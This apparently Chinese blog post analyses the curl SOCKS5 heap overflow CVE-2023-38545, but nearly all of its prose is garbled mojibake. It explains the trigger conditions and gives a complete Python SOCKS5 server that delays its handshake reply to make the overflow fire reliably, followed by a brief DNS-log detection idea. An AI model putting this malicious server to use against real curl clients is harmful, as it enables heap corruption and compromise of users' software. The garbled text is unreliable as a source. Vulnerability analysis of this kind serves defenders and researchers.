# ä»CURLç¢“æº¢å‡ºæ¼æ´(CVE-2023-38545)è°ˆè°ˆæ¼æ´å’Œé£é™©ç®¡ç†

CURLè¿™ä¸ªç»„ä»¶å¤§å®¶éƒ½ç†Ÿæ‚‰ï¼Œæ˜¯ä¸€ä¸ªç”¨æ¥å‘é€HTTPè¯·æ±‚çš„å‘½ä»¤è¡Œå·¥å…·ï¼ŒåŒæ—¶ä¹Ÿæœ‰libcurlçš„åº“ï¼Œå¯ä»¥æ–¹ä¾¿å…¶ä»–è½¯ä»¶é›†æˆè‡ªå·±çš„èƒ½åŠ›ã€‚

## æ¼æ´èƒŒæ™¯

æœ€è¿‘ï¼ŒCURLçš„ä½œè€…åœ¨è®¨è®ºåŒºæåˆ°äº†è¿‘æœŸä¼šå‘å¸ƒä¸€ä¸ªæ–°ç‰ˆæœ¬ï¼Œå…¶ä¸­ä¼šä¿®å¤ä¸¤ä¸ªæ¼æ´ï¼Œå…¶ä¸­ä¸€ä¸ªæ¼æ´è¢«æ ‡è®°ä¸ºé«˜å±ï¼Œè¿‘æœŸå®‰å…¨åœˆå­é‡Œçš„ä¸€ä¸ªæ˜æ˜Ÿç»„ä»¶ï¼Œæˆ‘ä¹Ÿä¸€ç›´åœ¨ä¿æŒå…³æ³¨ã€‚

![image-20231012100038486](/Users/jinxu/Library/Application Support/typora-user-images/image-20231012100038486.png)

å¹¶ä¸”æåˆ°

> *everything* that uses libcurl could theoretically use libcurl in a way that triggers this vulnerability.

å¤§å®¶æ‘’æ°”å‡ç¥ï¼šä¸‡ä¸€æ˜¯ä¸€ä¸ªlog4shellæ¥ä¸‹æ¥å°±è¯¥é€šå®µä¿®æ¼æ´äº†ã€‚ä¸è¿‡è¿˜å¥½è¿˜å¥½ï¼Œä¸€ä¸ªå®‰å…¨ç ”ç©¶å‘˜å‘ç°redhatæå–æ›´æ–°äº†è¡¥ä¸çš„patchå’Œtest-case.

![image-20231012100643173](/Users/jinxu/Library/Application Support/typora-user-images/image-20231012100643173.png)

éšç€æ›´å¤šçš„çƒ­å¿ƒç½‘å‹çš„å‚ä¸å’Œæ¼æ´ç»†èŠ‚è¢«å…¬å¼€ï¼Œå¤§å®¶é•¿èˆ’äº†ä¸€å£æ°”ï¼Œè¿˜å¥½è¿˜å¥½ï¼Œä¸æ˜¯ä¸ªå•¥å¤§äº‹ï¼Œæˆ‘æ‹‰äº†ä¸€ä»½ä»£ç æ ¹æ®[åŸå§‹æŠ¥å‘Š](https://hackerone.com/reports/2187833)åˆ†æäº†ä¸€ä¸‹ï¼Œå¤§æ¦‚æ˜¯è¿™ä¹ˆä¸ªäº‹ï¼š

> 1. æ ¹æ®SOCKSåè®®ï¼Œä¸€ä¸ªç›®çš„åœ°çš„æœ€å¤§é•¿åº¦ä¸º 255 ä¸ªå­—èŠ‚(byte)ã€‚
> 2. æ ¹æ®CURLå¯¹SOCKSåè®®çš„å®ç°ï¼Œè¿™ä¸ªHostNameä¼šè¢«memcopyåˆ°bufferä¸­ï¼Œä¸¢ç»™SOCKSä»£ç†æœåŠ¡å™¨ã€‚
> 3. ç›®çš„buffer: curlå¯¹socksåè®®å¼€è¾Ÿçš„ä¸€å—ç©ºé—´ï¼Œé»˜è®¤ä¸º16kB ã€‚
> 4. æºbuffer: HostNameï¼Œé™åˆ¶å¦‚ä¸‹ï¼š
>    1. æœ€å¤§é•¿åº¦ä¸º64kbï¼Œè¶…è¿‡è¿™ä¸ªé•¿åº¦æ— æ³•åˆ©ç”¨ï¼ˆCURLæ”¯æŒçš„æœ€å¤§URLé•¿åº¦ä¸º64kbï¼‰ã€‚
>    2. å¦‚æœsocks5åå•†å·²å®Œæˆï¼ŒHostNameä¼šè¢«è½¬ä¸ºIPï¼Œæ— æ³•åˆ©ç”¨ã€‚

ä½œè€…è¿˜æåˆ°å››ä¸ªåˆ©ç”¨æ¡ä»¶ï¼Œé”¦æ—­æ‚äº†æ‚ä»£ç ï¼Œåˆ†æäº†ä¸€ä¸‹åŸå› ï¼Œå’Œå¤§å®¶åˆ†äº«ä¸€ä¸‹å­ï¼Œå¦‚æœä½ ä¹Ÿæ„Ÿå…´è¶£çš„è¯ï¼Œä¸ç”¨è‡ªå·±ä»å¤´æ¥äº†ã€‚

## åˆ©ç”¨æ¡ä»¶

æœ‰å››ä¸ª

#### é™åˆ¶1: è¯·æ±‚ä½¿ç”¨socks5h

socks5æ˜¯å•¥ç±»ï¼Œsocksåè®®ä¸»è¦æ˜¯ç®¡ä¼ è¾“çš„ï¼Œæ ¹æ®è¿™ä¸ªåè®®çš„è®¾è®¡ï¼Œç›®çš„åœ°å€å¯ä»¥æ˜¯ä¸ªIPï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸ªåŸŸåï¼Œå¦‚æœæ˜¯åŸŸåçš„è¯CURLå°±æŠŠè¿™ä¸ªå«åš socks5h(å¸¦hostname)ï¼Œå°±æ˜¯ä¸‹é¢è¿™ä¸ªBND.ADDRğŸ‘‡

> ```
> +----+-----+-------+------+----------+----------+
> |VER | REP |  RSV  | ATYP | BND.ADDR | BND.PORT |
> +----+-----+-------+------+----------+----------+
> | 1  |  1  | X'00' |  1   | Variable |    2     |
> +----+-----+-------+------+----------+----------+
> ```

- ç”¨åˆ°socks5h == CURL DNSè§£æè¿™ä¸ªæ´»äº¤ç»™äº†ä»£ç†æœåŠ¡å™¨ï¼Œä¼ ä¸€ä¸ªåŸŸå+Portï¼Œå’ŒHTTP REQçš„å†…å®¹ã€‚

- ç”¨åˆ°socks5 == CURL æœ¬åœ°è§£æå¥½åŸŸåå¯¹åº”çš„IPï¼Œä¼ ä¸€ä¸ªIP+Portï¼Œå’ŒHTTP REQçš„å†…å®¹ã€‚

å¦‚æœä¸æ˜¯socks5hï¼Œåˆ™ä¸å½±å“ã€‚

#### é™åˆ¶2: æœ¬åœ°çš„bufferè®¾ç½®ï¼Œå°äº65kb

è¿™ä¸ªä¸»è¦æ˜¯CURLå¯¹URLçš„é™åˆ¶ï¼Œæœ€é•¿åªå¤„ç†65kbçš„URLï¼Œè¿‡é•¿å°±ä¸å¹²æ´»äº†ï¼Œèµ°ä¸åˆ°æ¼æ´è§¦å‘ç‚¹ã€‚

#### é™åˆ¶3: SOCKSæœåŠ¡å™¨æ²¡æœ‰åŠæ—¶å›å¤HELLOè¯·æ±‚

æœ‰ä¸€ä¸ªå…³é”®å€¼æ˜¯`socks5_resolve_local`ï¼Œè¿™ç©æ„æ˜¯ä¸ªå…¨å±€å˜é‡ï¼Œåªåœ¨`CONNECT_SOCKS_INIT`é˜¶æ®µé‡Œä¼šæ”¹åŠ¨è¿™ä¸ªå€¼ã€‚

æ­£å¸¸çš„é€»è¾‘ï¼š

> 1. socks5_resolve_local é»˜è®¤ä¸ºfalse
> 2. socks5åˆå§‹åŒ–é˜¶æ®µ `CONNECT_SOCKS_INIT` é˜¶æ®µè®¾ç½®ä¸ºtrueï¼Œå†™å…¥åå•†å¤´ï¼ŒçŠ¶æ€æœºåˆ°`CONNECT_SOCKS_READ`é˜¶æ®µï¼Œè·³è½¬åˆ° `CONNECT_SOCKS_READ_INIT`ï¼ˆè¯»è¿”å›é˜¶æ®µï¼‰
> 3. ä¸€æ¬¡è¯»å–å®Œåå•†åŒ…ï¼Œåˆ° `CONNECT_REQ_INIT` é˜¶æ®µ
> 4. `CONNECT_SOCKS_INIT`æ£€æŸ¥å‘ç°`socks5_resolve_local`ä¸ºTrueï¼Œè°ƒç”¨`CONNECT_RESOLVED`ï¼Œå°†DNSåœ°å€å¡«å……åˆ°åè®®çš„æŒ‡å®šå­—æ®µã€‚
> 5. åç»­å°±æ˜¯å’ŒSOCKS5åè®®æœåŠ¡å™¨çš„æ­£å¸¸æ•°æ®äº¤äº’äº†

```
CONNECT_SOCKS_READ_INIT` => `CONNECT_SOCKS_READ "hello" packet (method selection reply)
```

å‡ºbugçš„é€»è¾‘ï¼š

> 1. è°ƒç”¨`do_SOCKS5`æ–¹æ³•ï¼Œ `socks5_resolve_local `é»˜è®¤ä¸ºfalse
> 2. socks5åˆå§‹åŒ–é˜¶æ®µ `CONNECT_SOCKS_INIT` é˜¶æ®µè®¾ç½®ä¸ºtrueï¼Œå†™å…¥åå•†å¤´ï¼ŒçŠ¶æ€æœºåˆ°`CONNECT_SOCKS_READ`é˜¶æ®µï¼Œè·³è½¬åˆ° `CONNECT_SOCKS_READ_INIT`ï¼ˆè¯»è¿”å›é˜¶æ®µï¼‰
> 3. `CONNECT_SOCKS_READ_INIT`è¯»æ•°æ®çš„æ—¶å€™ï¼Œå‘ç°æ²¡æœ‰è¯»åˆ°serverçš„å›åŒ…æ•°æ®æˆ–è€…æ²¡è¯»åˆ°æŒ‡å®šæ•°é‡ï¼ˆ2ä¸ªå­—èŠ‚ï¼‰çš„å›åŒ…æ•°æ®ï¼Œè¿”å›`CURLPX_OK`
> 4. ä¸Šå±‚ç»§ç»­è°ƒç”¨ `do_SOCKS5`æ–¹æ³•ï¼Œ **`socks5_resolve_local `é»˜è®¤ä¸ºfalse**ï¼Œæ­¤æ—¶çŠ¶æ€æœºçŠ¶æ€ä¸º `CONNECT_SOCKS_READ`ï¼Œç»§ç»­ä»socksä»£ç†ä¸­è¯»å–æ•°æ®ï¼ˆå‡è®¾è¯»å–æˆæœï¼‰
> 5. èµ°åˆ° `CONNECT_REQ_INIT`,**æ£€æŸ¥å‘ç° `socks5_resolve_local `ä¸ºfalse**ï¼Œè®¤ä¸ºåº”è¯¥è¿œç¨‹è§£æï¼Œèµ°åˆ°`CONNECT_RESOLVE_REMOTE`ï¼ŒæŠŠhostnameæ•´ä¸ªmemory-copyè¿‡å»ï¼Œäºæ˜¯äº§ç”Ÿå †æº¢å‡ºã€‚

ä¸¤ä¸ªæµç¨‹é‡Œ1ã€2é˜¶æ®µä¸€æ ·ï¼ŒåŒºåˆ«å°±åœ¨äº3è¿™ä¸ªé˜¶æ®µï¼Œæ­£å¸¸é€»è¾‘æ˜¯ä¸€æ¬¡è¯»å®Œäº†ï¼Œæµç¨‹é€€å‡ºã€‚æ¼æ´é€»è¾‘æ˜¯ä¸€æ¬¡æ²¡è¯»å®Œï¼Œæ–¹æ³•é€€å‡ºå¯¼è‡´èµ°äº† `CONNECT_RESOLVE_REMOTE` é€»è¾‘åå¯¼è‡´äº†å †æº¢å‡ºã€‚

#### é™åˆ¶4: å¯æ§çš„æ¯”bufferé•¿çš„Hostçš„è¾“å…¥

è¿™ä¸ªä¸ç”¨å¤šè§£é‡Šï¼Œè¦æº¢å‡ºï¼Œå½“ç„¶è¦æºé•¿åº¦è¦æ¯”ç›®çš„é•¿åº¦å¤§ï¼Œä¸ç„¶æ²¡æ³•è¦†ç›–å †å¤–çš„æ•°æ®äº†ã€‚

## ç¨³å®šè§¦å‘

åœ¨githubä¸Šæœ‰äººå…¬å¼€åˆ©ç”¨æ–¹æ³•ï¼Œä½†å…¶å®æ˜¯ä¸èƒ½ç¨³å®šè§¦å‘çš„ï¼Œä¸»è¦åŸå› åœ¨äºä»tcpé‡Œè¯»ä¸¤ä¸ªå­—èŠ‚çš„æ¡æ‰‹åŒ…ï¼Œè¿˜è¦æ±‚è¿™ä¸¤ä¸ªå­—èŠ‚é€šè¿‡ä¸¤æ¬¡recvæ‰èƒ½æ”¶åˆ°ï¼Œè¿™ä¸ªéœ€è¦è‡ªå·±åšä¸€ä¸ªæ¶æ„çš„socks5æœåŠ¡å™¨æ‰èƒ½ç¨³å®šè§¦å‘ã€‚æ„ä»¶ä¸€socks5æœåŠ¡å™¨å¦‚ä¸‹

```python
# -*- coding: utf-8 -*-
"""
 Small Socks5 Proxy Server in Python
 from https://github.com/MisterDaneel/
"""

# Network
import socket
import select
import time
from struct import pack, unpack
# System
import traceback
from threading import Thread, activeCount
from signal import signal, SIGINT, SIGTERM
from time import sleep
import sys

#
# Configuration
#
MAX_THREADS = 200
BUFSIZE = 10
TIMEOUT_SOCKET = 5
LOCAL_ADDR = '0.0.0.0'
LOCAL_PORT = 9050
# Parameter to bind a socket to a device, using SO_BINDTODEVICE
# Only root can set this option
# If the name is an empty string or None, the interface is chosen when
# a routing decision is made
# OUTGOING_INTERFACE = "eth0"
OUTGOING_INTERFACE = ""

#
# Constants
#
'''Version of the protocol'''
# PROTOCOL VERSION 5
VER = b'\x05'
'''Method constants'''
# '00' NO AUTHENTICATION REQUIRED
M_NOAUTH = b'\x00'
# 'FF' NO ACCEPTABLE METHODS
M_NOTAVAILABLE = b'\xff'
'''Command constants'''
# CONNECT '01'
CMD_CONNECT = b'\x01'
'''Address type constants'''
# IP V4 address '01'
ATYP_IPV4 = b'\x01'
# DOMAINNAME '03'
ATYP_DOMAINNAME = b'\x03'


class ExitStatus:
    """ Manage exit status """
    def __init__(self):
        self.exit = False

    def set_status(self, status):
        """ set exist status """
        self.exit = status

    def get_status(self):
        """ get exit status """
        return self.exit


def error(msg="", err=None):
    """ Print exception stack trace python """
    if msg:
        traceback.print_exc()
        print("{} - Code: {}, Message: {}".format(msg, str(err[0]), err[1]))
    else:
        traceback.print_exc()


def proxy_loop(socket_src, socket_dst):
    """ Wait for network activity """
    while not EXIT.get_status():
        try:
            reader, _, _ = select.select([socket_src, socket_dst], [], [], 1)
        except select.error as err:
            error("Select failed", err)
            return
        if not reader:
            continue
        try:
            for sock in reader:
                data = sock.recv(BUFSIZE)
                if not data:
                    return
                if sock is socket_dst:
                    socket_src.send(data)
                else:
                    socket_dst.send(data)
        except socket.error as err:
            error("Loop failed", err)
            return


def connect_to_dst(dst_addr, dst_port):
    """ Connect to desired destination """
    sock = create_socket()
    if OUTGOING_INTERFACE:
        try:
            sock.setsockopt(
                socket.SOL_SOCKET,
                socket.SO_BINDTODEVICE,
                OUTGOING_INTERFACE.encode(),
            )
        except PermissionError as err:
            print("Only root can set OUTGOING_INTERFACE parameter")
            EXIT.set_status(True)
    try:
        sock.connect((dst_addr, dst_port))
        return sock
    except socket.error as err:
        error("Failed to connect to DST", err)
        return 0


def request_client(wrapper):
    """ Client request details """
    # +----+-----+-------+------+----------+----------+
    # |VER | CMD |  RSV  | ATYP | DST.ADDR | DST.PORT |
    # +----+-----+-------+------+----------+----------+
    try:
        s5_request = wrapper.recv(BUFSIZE)
    except ConnectionResetError:
        if wrapper != 0:
            wrapper.close()
        error()
        return False
    # Check VER, CMD and RSV
    if (
            s5_request[0:1] != VER or
            s5_request[1:2] != CMD_CONNECT or
            s5_request[2:3] != b'\x00'
    ):
        return False
    # IPV4
    if s5_request[3:4] == ATYP_IPV4:
        dst_addr = socket.inet_ntoa(s5_request[4:-2])
        dst_port = unpack('>H', s5_request[8:len(s5_request)])[0]
    # DOMAIN NAME
    elif s5_request[3:4] == ATYP_DOMAINNAME:
        sz_domain_name = s5_request[4]
        dst_addr = s5_request[5: 5 + sz_domain_name - len(s5_request)]
        port_to_unpack = s5_request[5 + sz_domain_name:len(s5_request)]
        dst_port = unpack('>H', port_to_unpack)[0]
    else:
        return False
    print(dst_addr, dst_port)
    return (dst_addr, dst_port)


def request(wrapper):
    """
        The SOCKS request information is sent by the client as soon as it has
        established a connection to the SOCKS server, and completed the
        authentication negotiations.  The server evaluates the request, and
        returns a reply
    """
    dst = request_client(wrapper)
    # Server Reply
    # +----+-----+-------+------+----------+----------+
    # |VER | REP |  RSV  | ATYP | BND.ADDR | BND.PORT |
    # +----+-----+-------+------+----------+----------+
    rep = b'\x07'
    bnd = b'\x00' + b'\x00' + b'\x00' + b'\x00' + b'\x00' + b'\x00'
    if dst:
        socket_dst = connect_to_dst(dst[0], dst[1])
    if not dst or socket_dst == 0:
        rep = b'\x01'
    else:
        rep = b'\x00'
        bnd = socket.inet_aton(socket_dst.getsockname()[0])
        bnd += pack(">H", socket_dst.getsockname()[1])
    reply = VER + rep + b'\x00' + ATYP_IPV4 + bnd
    try:
        wrapper.sendall(reply)
    except socket.error:
        if wrapper != 0:
            wrapper.close()
        return
    # start proxy
    if rep == b'\x00':
        proxy_loop(wrapper, socket_dst)
    if wrapper != 0:
        wrapper.close()
    if socket_dst != 0:
        socket_dst.close()


def subnegotiation_client(wrapper):
    """
        The client connects to the server, and sends a version
        identifier/method selection message
    """
    # Client Version identifier/method selection message
    # +----+----------+----------+
    # |VER | NMETHODS | METHODS  |
    # +----+----------+----------+
    try:
        identification_packet = wrapper.recv(BUFSIZE)
    except socket.error:
        error()
        return M_NOTAVAILABLE
    # VER field
    if VER != identification_packet[0:1]:
        return M_NOTAVAILABLE
    # METHODS fields
    nmethods = identification_packet[1]
    methods = identification_packet[2:]
    if len(methods) != nmethods:
        return M_NOTAVAILABLE
    for method in methods:
        if method == ord(M_NOAUTH):
            return M_NOAUTH
    return M_NOTAVAILABLE


def subnegotiation(wrapper):
    """
        The client connects to the server, and sends a version
        identifier/method selection message
        The server selects from one of the methods given in METHODS, and
        sends a METHOD selection message
    """
    method = subnegotiation_client(wrapper)
    # Server Method selection message
    # +----+--------+
    # |VER | METHOD |
    # +----+--------+
    if method != M_NOAUTH:
        return False
    reply = VER + method
    try:
        wrapper.sendall(VER)
        time.sleep(5)
        wrapper.sendall(method)
    except socket.error:
        error()
        return False
    return True


def connection(wrapper):
    """ Function run by a thread """
    if subnegotiation(wrapper):
        request(wrapper)


def create_socket():
    """ Create an INET, STREAMing socket """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT_SOCKET)
    except socket.error as err:
        error("Failed to create socket", err)
        sys.exit(0)
    return sock


def bind_port(sock):
    """
        Bind the socket to address and
        listen for connections made to the socket
    """
    try:
        print('Bind {}'.format(str(LOCAL_PORT)))
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((LOCAL_ADDR, LOCAL_PORT))
    except socket.error as err:
        error("Bind failed", err)
        sock.close()
        sys.exit(0)
    # Listen
    try:
        sock.listen(10)
    except socket.error as err:
        error("Listen failed", err)
        sock.close()
        sys.exit(0)
    return sock


def exit_handler(signum, frame):
    """ Signal handler called with signal, exit script """
    print('Signal handler called with signal', signum)
    EXIT.set_status(True)


def main():
    """ Main function """
    new_socket = create_socket()
    bind_port(new_socket)
    signal(SIGINT, exit_handler)
    signal(SIGTERM, exit_handler)
    while not EXIT.get_status():
        if activeCount() > MAX_THREADS:
            sleep(3)
            continue
        try:
            wrapper, _ = new_socket.accept()
            wrapper.setblocking(1)
        except socket.timeout:
            continue
        except socket.error:
            error()
            continue
        except TypeError:
            error()
            sys.exit(0)
        recv_thread = Thread(target=connection, args=(wrapper, ))
        recv_thread.start()
    new_socket.close()


EXIT = ExitStatus()
if __name__ == '__main__':
    main()
```

å…³é”®ä»£ç ï¼š

```
	...
  wrapper.sendall(VER)
  time.sleep(5)
  wrapper.sendall(method)
  ...
```

## æ¼æ´è¯æ˜

![image-20231012151015503](/Users/jinxu/Library/Application Support/typora-user-images/image-20231012151015503.png)

## æ¼æ´æ£€æµ‹

æ ¹æ®æ¼æ´åŸç†ï¼Œæ¼æ´çš„ç‰¹ç‚¹æ˜¯ä¼šåœ¨æœ¬åœ°è¿›è¡Œä¸€æ¬¡DNSè¯·æ±‚ï¼Œè¯·æ±‚çš„å¯¹è±¡æ˜¯ä¸€ä¸ªé•¿åº¦è¶…è¿‡16kBçš„åŸŸåï¼Œå¯ä»¥ä»¥æ­¤ä¸ºç‰¹å¾ï¼Œåœ¨DNSæ—¥å¿—ä¸­æ·»åŠ å¯¹åº”è§„åˆ™ä»¥æ£€æµ‹æ­¤å¨èƒã€‚
